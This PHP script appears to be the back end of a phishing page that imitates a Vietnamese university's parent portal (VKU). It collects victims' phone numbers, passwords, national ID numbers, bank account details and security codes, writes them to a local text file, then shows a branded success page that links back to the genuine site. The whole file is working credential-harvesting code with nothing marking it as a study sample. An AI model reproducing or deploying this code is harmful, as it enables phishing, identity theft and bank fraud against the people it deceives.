<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $data = [
        "SĐT" => $_POST["sdt"] ?? '',
        "Mật khẩu" => $_POST["password"] ?? '',
        "CCCD" => $_POST["cccd"] ?? '',
        "Email" => $_POST["email"] ?? '',
        "Địa chỉ" => $_POST["diachi"] ?? '',
        "Nghề nghiệp" => $_POST["nghenghiep"] ?? '',
        "Nơi làm việc" => $_POST["noilamviec"] ?? '',
        "Số TK ngân hàng" => $_POST["stk"] ?? '',
        "Tên ngân hàng" => $_POST["nganhang"] ?? '',
        "Mã bảo mật" => $_POST["capchar"] ?? '',
        "Thời gian gửi" => date("Y-m-d H:i:s"),
    ];

    $entry = "-----------------------------\n";
    foreach ($data as $key => $value) {
        $entry .= "$key: $value\n";
    }

    $file = 'data.txt';
    if (is_writable($file)) {
        file_put_contents($file, $entry, FILE_APPEND);
        echo "<h3>Thông tin đã được ghi lại thành công!</h3>";
    } else {
        echo "<h3>Không thể ghi dữ liệu vào file. Kiểm tra quyền ghi của thư mục.</h3>";
    }
    ?>

    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <title>Gửi thành công</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
        <style>
            body {
                background-color: #f8f9fa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
                text-align: center;
            }
            img {
                max-width: 100%;
                height: auto;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-8 text-center mb-5">
                    <img src="header_mobile_phuhuynh.png" alt="Logo VKU">
                </div>
            </div>
            <h3>Thông tin đã được ghi lại thành công!</h3>
            <p><a href="https://daotao.vku.udn.vn/phuhuynh" class="btn btn-primary mt-3">Quay lại trang nhập</a></p>
        </div>
    </body>
    </html>

<?php
} else {
    echo "Phương thức gửi không hợp lệ.";
}
?>
